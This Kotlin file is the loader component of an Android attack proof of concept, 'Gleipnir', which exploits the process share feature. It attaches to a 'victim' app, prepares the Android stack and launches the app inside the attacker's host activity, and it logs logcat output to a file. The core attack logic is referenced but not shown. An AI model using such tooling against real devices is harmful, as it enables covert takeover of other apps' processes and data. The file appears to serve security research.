/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.extendableLoader

import android.app.Activity
import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageInfo
import android.os.Build
import android.os.Process
import android.webkit.WebView
import org.gleipnir.app.extendableLoader.internal.LoaderContextImpl
import java.io.File


object GleipnirLoader : ILoader {

    val baseLoaderContext: LoaderContext = LoaderContextImpl() // default impl
    /**
     * Load and start the given App represented by the PackageInfo
     *
     * @param hostActivity The host activity (a Gleipnir Activity)
     * @param plugins list of enabled Plug-Ins
     * @param targetApplication the PackageInfo of the target Application
     */
    override fun loadAndStart(
        hostActivity: Activity,
        plugins: List<IPlugin>,
        targetApplication: PackageInfo
    ): Boolean {
        log("Loader [-] loadAndStart application $targetApplication with hostActivity $hostActivity")
        return handleLoadAndStart(hostActivity, plugins, targetApplication);
    }
    /**
     * Load and start the given App represented by the PackageInfo
     *
     * @param hostActivity The host activity (a Gleipnir Activity)
     * @param plugins list of enabled Plug-Ins
     * @param targetApplication the PackageInfo of the target Application
     * @param onFinish callback to be triggered when start process has finished
     */
    override fun loadAndStartAsync(
        hostActivity: Activity,
        plugins: List<IPlugin>,
        targetApplication: PackageInfo,
        onFinish: () -> Unit
    ): Boolean {
        log("Loader [-] loadAndStart application $targetApplication with hostActivity $hostActivity")
        // we initialize the webview right before we start the victim App.
        // We can ensure that Chrome initializes while the Android stack is unmodified.
        initWebView(hostActivity)

        Thread { // write the logcat output to a file
            startLogging(hostActivity.filesDir.absolutePath + "/logs/logcat.log")
            //SystemClock.sleep(1000)
            log("Hacktivity [-] start target appliation")
            // use queue?
            handleLoadAndStart(hostActivity, plugins, targetApplication)
            onFinish()
        }.start()
        return true
    }
    /**
     * The loader context representing all necessary elements of the Attack
     */
    override fun getLoaderContext(): LoaderContext {
        return baseLoaderContext
    }

    /**
     *  handle the request
     */
    fun handleLoadAndStart(
        hostActivity: Activity,
        plugins: List<IPlugin>,
        targetApplication: PackageInfo
    ): Boolean {
        log("Loader [-] attach to target application")
        baseLoaderContext.attach(hostActivity, plugins, targetApplication)
        log("Loader [-] bind application")
        baseLoaderContext.bind()
        log("Loader [-] prepare android stack")
        baseLoaderContext.prepareAndroidStack()
        log("Loader [-] launch application")
        baseLoaderContext.launch()
        return true
    }


    /**
     * Launches a new logging session.
     *
     * @param path location to put the logcat output to
     */
    fun startLogging(path: String) {
        Thread {
            log("Hacktivity [-] start logging")
            val loggingPath = File(path)
            loggingPath.delete()
            loggingPath.parentFile.mkdirs()
            loggingPath.createNewFile()
            val cmd = "logcat -f " + loggingPath.absolutePath
            Runtime.getRuntime().exec(cmd)
        }.start()
    }

    /**
     * Initialize the WebView
     */
    private fun initWebView(context: Context){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            val processName = getProcessName(context)
            val packageName: String = context.getPackageName()
            if (packageName != processName) {
                WebView.setDataDirectorySuffix(processName)
            }
        }
        try {
            WebView(context).loadUrl(".") // will cause Chrome to be initilaized
        } catch (exception: Exception) {
            log("Loader [-] loadAndStart [-] unable to initialize webview", exception)
        }
    }

    /**
     * Get current process name
     *
     * @param context to use for calls to the Android stack
     */
    private fun getProcessName(context: Context?): String? {
        if (context == null) return null
        val manager =
            context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        for (processInfo in manager.runningAppProcesses) {
            if (processInfo.pid == Process.myPid()) {
                return processInfo.processName
            }
        }
        return null
    }
}